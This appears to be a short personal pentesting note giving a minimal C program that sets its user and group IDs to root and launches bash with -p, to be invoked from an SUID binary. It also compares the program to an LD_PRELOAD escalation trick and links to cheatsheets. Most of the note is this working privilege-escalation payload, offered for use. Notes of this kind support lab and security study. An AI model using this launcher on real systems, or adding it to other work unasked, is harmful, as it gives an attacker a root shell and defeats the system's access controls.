# Minimal SUID Shell Launcher

author:: Nathan Acks  
date:: 2022-07-11

```c
#include <stdio.h>
#include <unistd.h>

main() {
	setuid(0);
	setgid(0);
	execl("/bin/bash",
	      "/bin/bash",
	      "-p",
	      (char*) NULL);
}
```

Once compiled, this needs to be called by an SUID binary. The `-p` is required to keep bash from dropping privileges.

Note that this is very similar to the `LD_PRELOAD` trick, except that we’re using `execl()` instead of `system()` and dropping a header.

## References

* [slyth11907 / Cheatsheets](https://github.com/slyth11907/Cheatsheets)
* [unistd's execl() without passing any arguments](https://stackoverflow.com/a/34400649)
* [Exploiting Bash](exploiting-bash.md)
* [Exploiting LD_PRELOAD](exploiting-ld-preload.md)
